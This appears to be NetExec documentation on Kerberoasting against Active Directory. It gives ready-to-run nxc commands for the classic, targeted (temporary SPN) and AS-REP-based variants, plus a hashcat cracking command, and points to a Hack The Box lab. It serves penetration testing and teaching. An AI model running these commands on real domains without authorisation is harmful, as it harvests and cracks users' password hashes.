---
description: Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting
---

# Kerberoasting

You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique

> The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/en/blog/how-kerberos-works/).

{% hint style="warning" %}
To perfom this attack, you need an account on the domain, or an AS-REP roastable account
{% endhint %}

```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

# Targeted Kerberoasting (`--targeted-kerberoast`)

For accounts that have **no** `servicePrincipalName`, normal Kerberoasting cannot request a TGS. **Targeted Kerberoasting** temporarily sets an SPN on the victim (`cifs/<sAMAccountName>`), requests a service ticket (same etype 23 hash as classic Kerberoasting), writes it to your `--kerberoasting` file, then **removes** the added SPN via LDAP.

{% hint style="warning" %}
You need LDAP **write** rights on `servicePrincipalName` for each targeted user (for example `GenericAll` on the user, `WriteProperty` on `servicePrincipalName`, or equivalent). The option **requires** `--kerberoasting` (output path).
{% endhint %}

Targets are **enabled** user accounts among the names you pass in that currently have **no** SPN. You can pass `sAMAccountName` values and/or a **file** containing one username per line (same `nargs="+"` pattern as `--kerberoast-account`).

```bash
nxc ldap 192.168.0.104 -u attacker -p pass --kerberoasting hashes.txt --targeted-kerberoast victim1 victim2
nxc ldap 192.168.0.104 -u attacker -p pass --kerberoasting hashes.txt --targeted-kerberoast users.list
```

* `--kerberoasting`: file where TGS hashes are appended (mandatory with this mode).
* `--targeted-kerberoast`: one or more `sAMAccountName` values and/or paths to files listing them.

If removal of the temporary SPN fails, NetExec logs a failure so you can clean up manually. Insufficient rights to modify the user’s SPN is reported as **No write access** for that account.

# Kerberoasting via AS-REP Roasting

> You can also perform Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining `--no-preauth-targets` and `--kerberoasting`.

```bash
nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

* `-u`: AS-REP roastable user (no pre-auth required).
* `--no-preauth-targets`: Single user or file containing list of users to target with Kerberoasting.

### Cracking with hashcat

```bash
hashcat -m13100 output.txt wordlist.txt
```

### Example

Active machine is a good example to test **Kerberoasting** with NetExec

{% embed url="https://www.hackthebox.com/machines/active" %}

### Useful ressources:

{% embed url="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting" %}

{% embed url="https://en.hackndo.com/kerberoasting/" %}

{% embed url="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/" %}
